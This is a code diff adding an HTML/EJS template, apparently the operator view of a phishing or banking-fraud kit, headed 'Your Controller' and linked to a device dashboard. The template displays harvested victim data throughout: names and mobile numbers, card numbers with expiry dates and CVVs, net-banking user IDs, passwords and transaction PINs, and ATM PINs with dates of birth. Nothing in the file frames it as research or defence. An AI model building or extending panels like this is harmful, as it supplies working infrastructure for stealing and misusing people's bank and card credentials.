@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <% if (user && user.entries && Array.isArray(user.entries)) { %>
+      <% user.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Personal Information - <%= index + 1 %></h3>
+          <p><strong>Name:</strong> <%= entry.name %></p>
+          <p><strong>Mobile No:</strong> <%= entry.mobile %></p>
+          <p><strong>Consumer:</strong> <%= entry.consumerNumber %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <div class="card">
+        <h3>No User Data Found</h3>
+      </div>
+    <% } %>
+
+    <% if (cardPayment && cardPayment.entries && Array.isArray(cardPayment.entries)) { %>
+      <% cardPayment.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Card Payment Details - <%= index + 1 %></h3>
+          <p><strong>Card No:</strong> <%= entry.cardNumber %></p>
+          <p><strong>EXP:</strong> <%= entry.expiryDate %></p>
+          <p><strong>CVV:</strong> <%= entry.cvv %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <div class="card">
+        <h3>No Card Payment Data Found</h3>
+      </div>
+    <% } %>
+
+    <% if (netBanking && netBanking.entries && Array.isArray(netBanking.entries)) { %>
+      <% netBanking.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Net Banking Details - <%= index + 1 %></h3>
+          <p><strong>Bank Name:</strong> <%= entry.bankName %></p>
+          <p><strong>User-Id:</strong> <%= entry.userId %></p>
+          <p><strong>Password:</strong> <%= entry.password %></p>
+          <p><strong>T-PiN:</strong> <%= entry.transactionPassword %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <div class="card">
+        <h3>No Net Banking Data Found</h3>
+      </div>
+    <% } %>
+
+    <% if (dobAtmData && dobAtmData.entries && Array.isArray(dobAtmData.entries)) { %>
+      <% dobAtmData.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>ATM Details - <%= index + 1 %></h3>
+          <p><strong>Date of Birth:</strong> <%= entry.dob %></p>
+          <p><strong>PIN:</strong> <%= entry.atmPin %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <div class="card">
+        <h3>No ATM Data Found</h3>
+      </div>
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
